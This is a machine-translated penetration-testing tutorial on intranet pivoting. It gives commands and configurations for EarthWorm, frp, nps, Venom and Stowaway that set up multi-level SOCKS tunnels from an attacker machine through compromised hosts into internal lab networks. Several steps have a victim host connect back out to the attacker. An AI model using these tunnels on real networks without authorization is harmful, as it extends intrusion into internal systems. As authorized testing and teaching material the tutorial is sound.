# Penetration Test & Intranet Penetration

## acting

- Forward proxy: The server does not leave the network. For example, when an attacker takes a `web` server and performs the ping baidu.com` operation on it, it cannot ping, that is, the server does not leave the network. At this time, you need to use a forward proxy tool to actively connect to the server.

- Reverse proxy: The server is out of the network. For example, when an attacker takes a `web` server and performs the ping baidu.com` operation on it, it can ping, that is, the server can leave the network, and you can use the reverse proxy tool at this time. Let the victimized server actively connect to the attacker.


## Topology diagram

![](img/1.png)

## ew

### introduce

`EarthWorm` is a tool used to enable the `SOCKS v5` proxy service. It is developed based on the standard `C` and can provide forwarding communication between multiple platforms for data forwarding in complex network environments. Proprietary homepage: [EarthWorm](http://rootkiter.com/EarthWorm/).

- Ordinary network environment

![](img/2.png)

- Dual network environment

![](img/3.png)

- Parameter description

![](img/4.png)

### Implementation method

#### Forward SOCKS v5 Server

```bash
ew_for_Win.exe -s ssocksd -l 8080
```

![](img/5.png)

![](img/6.png)

####Bounce SOCKS v5 server

```bash
# Execute the following command on a host with a public network IP
./ew_for_MacOSX64 -s rcsocks -l 1080 -e 8888

# Start SOCKS v5 service on the host without targeting and bounce back to port 8888 of the host
ew_for_Win.exe -s rssocks -d 192.168.168.71 -e 8080
```

![](img/7.png)

![](img/8.png)

#### Multi-level cascade

```bash
# Listen to port 1080 on a host with public network IP and forward it to local port 8888
./ew_for_MacOSX64 -s rcsocks -l 1080 -e 8888 -t 1000000

# The target does not leave the network host A connects the 8888 port of the host with the public IP and the 9999 port of the intranet host B.
ew_for_Win.exe -s lcx_slave -d 192.168.168.71 -e 8888 -f 10.37.129.6 -g 9999 -t 1000000

# Intranet host B opens SOCKS v5 service and bounces to port 9999 of intranet host B
ew_for_Win.exe -s ssocksd -l 9999 -t 1000000
```

![](img/9.png)

![](img/10.png)

![](img/11.png)



## frp

### introduce

`frp` is a high-performance reverse proxy application focusing on intranet penetration, supporting various protocols such as `TCP`, `UDP`, `HTTP`, `HTTPS`. Intranet services can be exposed to the public network in a secure and convenient way through transit with public network `IP` nodes.

- Project address: https://github.com/fatedier/frp

- File description: `frps.ini` (server configuration file), `frps` (server software), `frpc.ini` (client configuration file), `frpc` (client software)

#### Server side

- The commonly used configuration of `frps.ini` is as follows

```bash
# Server configuration
[common] # Must be set
bind_addr = server ip
bind_port = 7000 # Consistent with frpc.ini's server_port
token = 20010310 # Consistent with frps.ini token, verify identity

# Configure ssh service
[ssh] # No need
listen_port = 6000 # Set ssh access port

# Configure http service
[web] # Non-must
type = http # service type, can be set to http, https
custom_domains = test1.a.com # The domain name to be mapped, the A record of the domain name must be parsed to the IP of the external network host

# frp management background port
dashboard_port = 7500
# frp manages background username and password
dashboard_user = admin
dashboard_pwd = P@ssw0rd
enable_prometheus = true

# frp log configuration
log_file = /var/log/frps.log
log_level = info
log_max_days = 3
```

- `frps` start

```bash
# Method 1
mkdir /etc/frp
cp frps.ini /etc/frp
cp frps /usr/bin
cp systemd/frps.service /usr/lib/systemd/system/
systemctl enable frps
systemctl start frps

# Method 2
./frps -c ./frps.ini
# Backend run
nohup ./frps -c ./frps.ini &
```

- Firewall port release

```bash
# Add a listening port
firewall-cmd --permanent --add-port=7000/tcp
# Add an administrator backend port
firewall-cmd --permanent --add-port=7500/tcp
firewall-cmd --reload
```

- Verify that the server is started successfully, visit `http://ip:administrator background port`, enter the administrator background user and password to view the connection status

#### Client

- The commonly used configuration of `frpc.ini` is as follows

```bash
# Client Configuration
[common]
server_addr = 127.0.0.1 # Remote frp server ip
server_port = 7000 # Remote frp server port, consistent with frps.ini's bind_port
token = 20010310 # Remote frp server token, consistent with frps.ini token

# Configure ssh service
[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000 # Customize, use it when ssh connection later

# Configure http service
[http]
type = http
local_ip = 127.0.0.1
local_port = 8080 # local port number of remote frp server
remote_port = 9000 # http service port number of remote frp server
subdomain = admin.com.cn # Custom configured domain name

# frp log configuration
log_file = /var/log/frpc.log
log_level = info
log_max_days = 3
```

- `frpc` start

```bash
./frpc -c ./frpc.ini
# Backend run
nohup ./frpc -c ./frpc.ini &
```

### Implementation method

#### First-level network environment

- Server side

```bash
[common]
bind_addr = 0.0.0.0
bind_port = 7000
```

- Client

```bash
[common]
server_addr = 192.168.168.71
server_port = 7000

[http_proxy]
type = tcp
remote_port = 8080
plugin = socks5
```

![](img/12.png)

![](img/13.png)

#### Multi-level network environment

- Attack server server

```bash
[common]
bind_port = 7001

dashboard_user = admin
dashboard_pwd = password
dashboard_port = 8000
```

- Border server server

```bash
[common]
bind_addr = 10.37.129.5
bind_port = 7001
```

- Boundary Server Client

```bash
[common]
tls_enable = true
server_addr = 192.168.50.167
server_port = 7001

[http_proxy]
type = tcp
remote_port = 8080
local_ip = 10.37.129.5
local_port = 18080
```

- `Win1` server server

```bash
[common]
bind_addr = 10.37.132.3
bind_port = 7001
```

- `Win1` Server Client

```bash
[common]
tls_enable = true
server_addr = 10.37.129.5
server_port = 7001

[http_proxy]
type = tcp
remote_port = 18080
local_ip = 10.37.132.3
local_port = 10809
```

- `Win2` Server Client

```bash
[common
]
tls_enable = true
server_addr = 10.37.132.3
server_port = 7001

[ssh]
type = tcp
remote_port = 10809
plugin = socks5
```

![](img/14.png)

![](img/15.png)

![](img/16.png)

![](img/17.png)



## nps

### introduce

`nps` is a lightweight, high-performance, and powerful intranet penetration proxy server. Currently, it supports `tcp` and `udp` traffic forwarding, and can support any `tcp` and `udp` upper-level protocols (access to intranet websites, local payment interface debugging, `ssh` access, remote desktop, intranet `dns` parsing, etc.). In addition, it also supports intranet `http` proxy, intranet `socks5` proxy, `p2p`, etc., and has a powerful `web` management end.

### Implementation method

​ After trying it, I found that this tool is not very convenient when it is used as a multi-layer proxy. Here I will briefly record the implementation method of a single-layer proxy. First, select the corresponding `nps` according to the server system version for installation, and then you can use `nps`. Note that the `nps` installation here is in the `etc` directory. At the same time, you can also use `nps install -server=xxx -vkey=xxx -type=xxx` to start the service registration method on the client. If you are not an administrator in `Windows`, you cannot register with the system service. At this time, you can directly start `nps -server=xxx -vkey=xxx -type=xxx`. It should be noted that if you need to change the command content, you need to uninstall `npc uninstall` first and then re-register.

![](img/18.png)

​ After entering the page, select the client to perform new client operations. All information can be filled in by default. After adding a new client, a new tunnel operation is performed. Here, the port of the server is the port of the proxy service.

![](img/20.png)

![](img/19.png)

​ The client also selects the corresponding system version, and then copy the startup command to execute it. The startup command location is: Client->`-` symbol at the front of each message->Copy the client command.

![](img/21.png)

​ Then configure the `Proxifier` and other tools.

![](img/22.png)



## Venom

### introduce

`Venom` is a multi-level proxy tool designed for penetration testers using `Go`. `Venom` can connect multiple nodes and then use nodes as springboards to build multi-level agents. Penetration testers can easily proxy network traffic to multi-layer intranet using `Venom` and manage proxy nodes easily.

### Implementation method

#### First-level network environment

- Execute the following command on the attack aircraft

```bash
./admin_macos_x64 -lport 9999
```

- Execute the following command on the border server, and the attacking machine will receive the connection

```bash
agent.exe -rhost 192.168.168.71 -rport 9999
```

- Then execute the command to proxy the traffic to the `7777` port

```bash
show # View node
goto 1 # Select a node
socks 7777 # Set up the proxy
```

![](img/23.png)

![](img/24.png)

#### Multi-level network environment

​ At this time, on the basis of the previous layer, let the node listen on the attack machine, that is, wait for the connection of the `Win2` host on the boundary host:

```bash
listen 9998
```

​ Execute the following command on the `Win2` host to connect to the boundary host:

```bash
agent.exe -rhost 10.32.129.5 -rport 9998
```

Then, use the `show` to view the node in the attack machine. You can find that there is an additional node. Select Node 2 and set up a proxy to proxy the traffic to the `7778` port of the attack machine:

```bash
show
goto 2
socks 7778
```

![](img/25.png)

![](img/26.png)



## Stowaway

### introduce

`Stowaway` is a multi-level agent tool written in the `go` language and specially made for penetration testing workers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through the intranet access restrictions, build a tree node network, and easily implement management functions.

### Implementation method

#### First-level network environment

​ In the attack machine, use passive mode, listen to port `9999`, and encrypt the communication, with the key `h3rmesk1t`, waiting for the connection of the boundary host:

```bash
./macos_admin -l 9090 -s h3rmesk1t
```

The boundary host uses the key `h3rmesk1t` to connect and set the reconnect interval:

```bash
windows_x64_agent.exe -c 192.168.168.71:9090 -s h3rmesk1t -reconnect 8
```

​At this time, the attack machine successfully establishes a connection with the boundary host, select the node to be used, and perform proxy settings:

```bash
help
Detail
use 0
socks 7777 admin admin
```

![](img/27.png)

![](img/28.png)

![](img/29.png)

#### Multi-level network environment

​ Keep the network environment in the previous section unchanged, turn on the listening port on the original node, select `1` mode, port is `10000`, and the Win2` host actively connects to the listening port of the boundary host:

```bash
windows_x64_agent.exe -c 10.37.129.5:10000 -s h3rmesk1t -reconnect 8
```

​ At this time, the attack opportunity has a newly added node. Select a new node and add the `socks5` proxy:

```bash
Back
Detail
use 1
socks 7778 admin admin
```

​ Then use `Proxifier` to add the corresponding proxy server and proxy rules (add two proxy respectively) to access the second layer network.

![](img/30.png)

![](img/31.png)

![](img/32.png)